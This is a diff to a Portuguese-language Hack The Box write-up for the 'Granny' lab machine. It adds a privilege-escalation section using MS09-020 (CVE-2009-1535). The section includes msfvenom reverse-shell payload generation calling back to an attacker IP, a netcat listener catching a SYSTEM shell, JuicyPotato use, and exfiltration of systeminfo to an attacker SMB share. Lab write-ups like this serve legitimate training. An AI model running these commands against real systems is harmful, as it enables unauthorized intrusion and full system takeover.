@@ -1,6 +1,6 @@
 ---
 title:     "Hack The Box -Granny"
-tags: [windows,easy]
+tags: [windows,easy,MS09-020,CVE-2009-1535]
 categories: HackTheBox
 ---
 
@@ -235,7 +235,79 @@ Estanho... verificando os user o usuario add com o exploit nao aparece
 
 ![8.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-granny/8.jpg)
 
+## GET SYSTEM
+
+Depois de ter testado varios exploits consegui obter uma shell de SYSTEM
+
+Exploits testados: MS11-011.exe, ms11-046.exe, ms11-080-AddUser.exe, ms11-080.exe, MS14-002.exe, MS14-068.exe, MS14-40-x86.exe, Taihou32.exe
+
+Final o MS09-020-KB970483-CVE-2009-1535-IIS6 funcionou
+
+***reference** https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS09-020
+
+![9.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-granny/9.jpg)
+
+Primeiro gere seu payload:
+
+`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.36 LPORT=53 -f exe -o reverse.exe`
+
+Em seguida faca o download do exploit https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS09-020
+
+Leia a descricao do mesmo para entender mais....
+
+Pronto, depois de transferir o exploit + payload
+
+Deixei sua porta escolhida ouvindo 
+
+```
+root@kali:~/HTB-Windows/granny/MS09-020-KB970483-CVE-2009-1535-IIS6# rlwrap nc -nlvp 53
+listening on [any] 53 ...
+connect to [10.10.14.36] from (UNKNOWN) [10.10.10.15] 1044
+Microsoft Windows [Version 5.2.3790]
+(C) Copyright 1985-2003 Microsoft Corp.
+
+C:\WINDOWS\Temp>whoami
+whoami
+nt authority\system
+
+C:\WINDOWS\Temp>
+
+```
+
+Executamos
+
+```
+C:\WINDOWS\Temp>.\IIS6.0.exe "C:\WINDOWS\Temp\reverse.exe"
+.\IIS6.0.exe "C:\WINDOWS\Temp\reverse.exe"
+-------------------------------------------
+kindle-->Got WMI process Pid: 1820 
+begin to try
+kindle-->Found token SYSTEM 
+kindle-->Command:C:\WINDOWS\Temp\reverse.exe
+```
+
+## Rascunho
+
+```
+
+git clone https://github.com/vulnersCom/nmap-vulners /usr/share/nmap/scripts/vulners
+nmap --script-updatedb
 
 
 
+nmap --script=vulners/vulners.nse -p80 -Pn -oN nmap/vulners 10.10.10.15
+
+
+C:\PrivEsc\JuicyPotato.exe -l 1337 -p C:\PrivEsc\reverse.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
+
+impacket-smbserver tools .
+systeminfo >> \\10.10.14.36\tools\systeminfo.txt
+
+
+
+python windows-exploit-suggester.py --database 2020-06-23-mssb.xls --systeminfo /root/HTB-Windows/granny/systeminfo.txt
+
+
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.36 LPORT=53 -f exe -o reverse.exe
+```
 
